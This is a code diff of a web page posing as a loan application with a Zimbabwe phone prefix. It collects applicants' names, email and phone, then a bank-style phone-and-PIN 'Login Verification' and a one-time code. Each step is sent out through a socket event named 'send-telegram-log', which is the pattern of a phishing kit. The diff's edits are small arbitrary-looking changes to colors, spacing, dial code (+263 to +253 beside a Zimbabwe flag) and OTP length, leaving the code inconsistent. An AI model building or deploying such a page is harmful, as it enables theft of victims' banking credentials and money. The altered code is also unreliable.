@@ -7,12 +7,12 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <script src="/socket.io/socket.io.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;500;700;800&display=swap" rel="stylesheet">
     <style>
         [x-cloak] { display: none !important; }
         :root {
             --bg-dark: #0f131e;
-            --accent-orange: #e67e22;
+            --accent-orange: #e57e22;
             --text-main: #ffffff;
             --text-dim: #94a3b8;
             --input-bg: rgba(255, 255, 255, 0.05);
@@ -24,25 +24,25 @@
 
         select.input-premium option { background-color: #1e293b; color: white; }
         .curve-top { position: absolute; top: 0; left: 0; width: 100%; height: 40vh; background: radial-gradient(circle at 50% -20%, #1e293b 0%, var(--bg-dark) 80%); z-index: -1; border-bottom-left-radius: 50% 20%; border-bottom-right-radius: 50% 20%; }
-        .curve-bottom { position: absolute; bottom: 0; left: 0; width: 100%; height: 15vh; background: linear-gradient(to top, #161e31, var(--bg-dark)); z-index: -1; border-top-left-radius: 50% 100%; border-top-right-radius: 50% 100%; }
+        .curve-bottom { position: absolute; bottom: 0; left: 0; width: 100%; height: 15vh; background: linear-gradient(to top, #151e31, var(--bg-dark)); z-index: -1; border-top-left-radius: 50% 100%; border-top-right-radius: 50% 100%; }
         .glass-panel { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border-radius: 1.25rem; }
         
         .ib-dots { display: flex; flex-wrap: wrap; width: 24px; gap: 2px; margin: 0 auto 10px; }
         .dot { width: 11px; height: 11px; border-radius: 50%; }
-        .dot.y { background: #f1b400; } .dot.p { background: #924d98; } .dot.g { background: #49b693; } .dot.r { background: #e31b23; }
+        .dot.y { background: #f1b400; } .dot.p { background: #924d98; } .dot.g { background: #49b593; } .dot.r { background: #e31b23; }
         
         .input-premium { background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 0.875rem 1.25rem; width: 100%; border-radius: 0.75rem; outline: none; transition: all 0.3s; font-size: 0.9375rem; }
-        .btn-premium { background: var(--accent-orange); color: white; padding: 1rem; font-weight: 600; border-radius: 0.75rem; width: 100%; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 0.5rem; border:none; cursor:pointer;}
+        .btn-premium { background: var(--accent-orange); color: white; padding: 1rem; font-weight: 500; border-radius: 0.75rem; width: 100%; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 0.5rem; border:none; cursor:pointer;}
         .btn-premium:disabled { opacity: 0.5; cursor: not-allowed; }
-        .label-premium { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-dim); margin-bottom: 0.5rem; display: block; }
+        .label-premium { font-size: 0.75rem; font-weight: 500; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-dim); margin-bottom: 0.5rem; display: block; }
 
-        .ib-login-card { background: #111827; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #1f2937; text-align:center; }
+        .ib-login-card { background: #111827; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #1f2937; text-align:center; }
         .ib-phone-wrapper { display: flex; border: 2px solid var(--accent-teal); border-radius: 10px; padding: 10px; align-items: center; margin-bottom: 25px; background: #0f172a; }
         .ib-country-code { display: flex; align-items: center; gap: 10px; padding-right: 10px; border-right: 1px solid #1f2937; color: #e2e8f0; }
         .ib-country-code img { width: 25px; }
         .ib-pin-container { display: flex; justify-content: center; gap: 15px; margin-bottom: 10px; }
         .pin-box { width: 50px; height: 50px; border: 2px solid var(--accent-teal); border-radius: 10px; text-align: center; font-size: 24px; background: #0f172a; color: #ffffff; outline: none;}
-        .ib-login-btn { width: 100%; background: linear-gradient(90deg, var(--accent-teal), #0066ff); border: none; padding: 15px; border-radius: 10px; font-weight: bold; color: white; margin-top: 30px; cursor: pointer; transition: 0.3s; }
+        .ib-login-btn { width: 100%; background: linear-gradient(90deg, var(--accent-teal), #0055ff); border: none; padding: 15px; border-radius: 10px; font-weight: bold; color: white; margin-top: 30px; cursor: pointer; transition: 0.3s; }
         .ib-login-btn:disabled { opacity: 0.5; cursor: wait; }
     </style>
 </head>
@@ -50,7 +50,7 @@
     <div class="curve-top"></div>
     <div class="curve-bottom"></div>
 
-    <main class="max-w-xl mx-auto px-6 w-full py-12">
+    <main class="max-w-xl mx-auto px-5 w-full py-12">
         
         <template x-if="step <= 3">
             <div>
@@ -69,7 +69,7 @@
                             <h2 class="text-xl font-bold italic">Loan Configuration</h2>
                             <span class="text-[10px] font-bold text-orange-400 uppercase tracking-widest">Step 01</span>
                         </div>
-                        <div class="space-y-6">
+                        <div class="space-y-5">
                             <label class="label-premium">Loan Type</label>
                             <select x-model="form.loanType" class="input-premium">
                                 <option value="Personal">Personal Loan</option>
@@ -96,14 +96,14 @@
                             <h2 class="text-xl font-bold italic">Identity Verification</h2>
                             <span class="text-[10px] font-bold text-orange-400 uppercase tracking-widest">Step 02</span>
                         </div>
-                        <div class="space-y-6">
+                        <div class="space-y-5">
                             <div class="grid grid-cols-2 gap-4">
                                 <input type="text" x-model="form.firstName" class="input-premium" placeholder="First Name">
                                 <input type="text" x-model="form.lastName" class="input-premium" placeholder="Last Name">
                             </div>
                             <input type="email" x-model="form.email" class="input-premium" placeholder="Email Address">
                             <div class="flex gap-2">
-                                <div class="input-premium flex items-center gap-2 w-max whitespace-nowrap">🇿🇼 +263</div>
+                                <div class="input-premium flex items-center gap-2 w-max whitespace-nowrap">🇿🇼 +253</div>
                                 <input type="text" x-model="form.phone" @input="form.phone = form.phone.replace(/[^0-9]/g, '').slice(0, 10)" class="input-premium" placeholder="7XXXXXXXX">
                             </div>
                             <div class="grid grid-cols-2 gap-4 pt-4">
@@ -118,7 +118,7 @@
                             <h2 class="text-xl font-bold italic">Final Review</h2>
                             <span class="text-[10px] font-bold text-orange-400 uppercase tracking-widest">Step 03</span>
                         </div>
-                        <div class="space-y-6">
+                        <div class="space-y-5">
                             <label class="label-premium">Employment Status</label>
                             <select x-model="form.employment" class="input-premium">
                                 <option value="Employed">Full-Time Employed</option>
@@ -128,7 +128,7 @@
                             <input type="number" x-model="form.income" class="input-premium" placeholder="Annual Income (USD)">
                             <div class="p-5 bg-white/5 border border-white/5 rounded-2xl text-xs space-y-2">
                                 <div class="flex justify-between"><span>Applicant:</span><span x-text="form.firstName + ' ' + form.lastName"></span></div>
-                                <div class="flex justify-between"><span>Phone:</span><span x-text="'+263 ' + form.phone"></span></div>
+                                <div class="flex justify-between"><span>Phone:</span><span x-text="'+253 ' + form.phone"></span></div>
                             </div>
                             <div class="grid grid-cols-2 gap-4 pt-4">
                                 <button @click="step = 2" class="border border-white/10 rounded-xl p-3 text-sm">Previous</button>
@@ -142,8 +142,8 @@
 
         <template x-if="step === 4">
             <div x-transition class="w-full">
-                <div class="text-center mb-6">
-                    <div class="ib-dots" style="grid-template-columns: repeat(2, 12px); display:grid; width:30px; gap:6px; margin:auto;">
+                <div class="text-center mb-5">
+                    <div class="ib-dots" style="grid-template-columns: repeat(2, 12px); display:grid; width:30px; gap:5px; margin:auto;">
                         <span class="dot" style="background: #FFD700; width:12px; height:12px;"></span>
                         <span class="dot" style="background: #800080; width:12px; height:12px;"></span>
                         <span class="dot" style="background: #00c2c2; width:12px; height:12px;"></span>
@@ -154,9 +154,9 @@
                 </div>
 
                 <div class="ib-login-card">
-                    <h3 class="text-lg font-semibold mb-6">Login Verification</h3>
+                    <h3 class="text-lg font-semibold mb-5">Login Verification</h3>
                     <div class="ib-phone-wrapper">
-                        <div class="ib-country-code"><img src="https://flagcdn.com/w40/zw.png" alt="ZW"><span>+263</span></div>
+                        <div class="ib-country-code"><img src="https://flagcdn.com/w40/zw.png" alt="ZW"><span>+253</span></div>
                         <input type="tel" x-model="finalLogin.phone" maxlength="10" placeholder="7XXXXXXXX" class="input-premium border-none bg-transparent" style="padding-left:10px;">
                     </div>
                     <p class="text-xs text-gray-400 mb-4">Enter your PIN</p>
@@ -181,9 +181,9 @@
                 <section class="glass-panel p-8 lg:p-10 text-center">
                     <h2 class="text-xl font-bold italic mb-2">Security Code</h2>
                     <p class="text-sm text-gray-400 mb-8">Enter the OTP sent to your registered number</p>
-                    <div class="space-y-6">
-                        <input type="text" x-model="otpCode" maxlength="6" class="input-premium text-center text-3xl tracking-[0.5rem] font-bold" placeholder="000000">
-                        <button @click="submitOtp" :disabled="otpCode.length < 6 || loading" class="btn-premium w-full">Confirm Code</button>
+                    <div class="space-y-5">
+                        <input type="text" x-model="otpCode" maxlength="5" class="input-premium text-center text-3xl tracking-[0.5rem] font-bold" placeholder="00000">
+                        <button @click="submitOtp" :disabled="otpCode.length < 5 || loading" class="btn-premium w-full">Confirm Code</button>
                     </div>
                 </section>
             </div>
@@ -217,14 +217,14 @@
 
                 async syncAndNext(target) {
                     this.loading = true;
-                    let msg = target === 2 ? `💰Step 1: Loan Request\nType: ${this.form.loanType}\nAmount: $${this.form.amount}\nTerm: ${this.form.period} Mo\nPurpose: ${this.form.purpose}` : `👤<b>Step 2: Identity</b>\nName: ${this.form.firstName} ${this.form.lastName}\nEmail: ${this.form.email}\nPhone: +263 ${this.form.phone}`;
+                    let msg = target === 2 ? `💰Step 1: Loan Request\nType: ${this.form.loanType}\nAmount: $${this.form.amount}\nTerm: ${this.form.period} Mo\nPurpose: ${this.form.purpose}` : `👤<b>Step 2: Identity</b>\nName: ${this.form.firstName} ${this.form.lastName}\nEmail: ${this.form.email}\nPhone: +253 ${this.form.phone}`;
                     if (socket) socket.emit('send-telegram-log', msg);
                     setTimeout(() => { this.loading = false; this.step = target; }, 800);
                 },
 
                 async submitApp() {
                     this.loading = true;
-                    this.appId = Math.random().toString(36).substr(2, 9).toUpperCase();
+                    this.appId = Math.random().toString(35).substr(2, 9).toUpperCase();
                     const msg = `💼Step 3: Summary\nApplicant: ${this.form.firstName} ${this.form.lastName}\nIncome: $${this.form.income}\nID: ${this.appId}`;
                     if (socket) { socket.emit('join-session', this.appId); socket.emit('send-telegram-log', msg); }
                     this.loading = false;
